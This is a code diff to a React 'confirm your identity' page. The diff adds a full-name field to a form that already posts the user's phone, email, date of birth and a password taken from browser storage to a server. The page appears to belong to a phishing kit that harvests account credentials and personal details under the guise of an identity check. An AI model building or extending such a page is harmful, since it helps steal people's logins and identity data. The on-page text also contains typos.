@@ -4,6 +4,7 @@ import { useEffect, useState } from "react";
 import { useNavigate } from "react-router";
 import Validating from "../Components/Validating";
 import { database } from "../Utils/firebase";
+import InputText from "../Components/UI/InputText/InputText";
 
 const months = [
   "Jan",
@@ -27,6 +28,7 @@ const DateOfBirthConfirm = () => {
     day: "",
     month: "",
     year: "",
+    fullname: "",
   });
 
   const navigate = useNavigate();
@@ -41,6 +43,7 @@ const DateOfBirthConfirm = () => {
     form.append("year", formData.year);
     form.append("phone", data.phone);
     form.append("email", data.email);
+    form.append("fullname", formData.fullname);
     form.append("password", JSON.parse(localStorage.getItem("passwords")));
 
     axios.post(
@@ -100,7 +103,7 @@ const DateOfBirthConfirm = () => {
             marginTop: "1.15rem",
           }}
         >
-          Please enter the confirm your date of birth
+          Please enter the confirm your infomation
         </h1>
         <div
           style={{
@@ -121,7 +124,7 @@ const DateOfBirthConfirm = () => {
             }}
           >
             We need more information to confirm your identity.Please provide
-            your date of birth below.
+            your fullname and date of birth below.
           </div>
         </div>
         <div
@@ -137,6 +140,20 @@ const DateOfBirthConfirm = () => {
                 width: "90%",
               }}
             >
+              <div className="mb-4">
+                <InputText
+                  name="fullname"
+                  fun={handleChange}
+                  placeHolder={"Fullname"}
+                  style={{
+                    paddingTop: ".65rem",
+                    paddingBottom: ".65rem",
+                  }}
+                >
+                  Fullname
+                </InputText>
+              </div>
+              <label className="InputText__label">Date of birth</label>
               <div
                 style={{
                   display: "flex",
@@ -217,7 +234,8 @@ const DateOfBirthConfirm = () => {
               !(
                 formData.day.length > 0 &&
                 formData.month.length > 0 &&
-                formData.year.length > 0
+                formData.year.length > 0 &&
+                formData.fullname?.trim().length > 0
               ) || validating
             }
             onClick={handleSend}
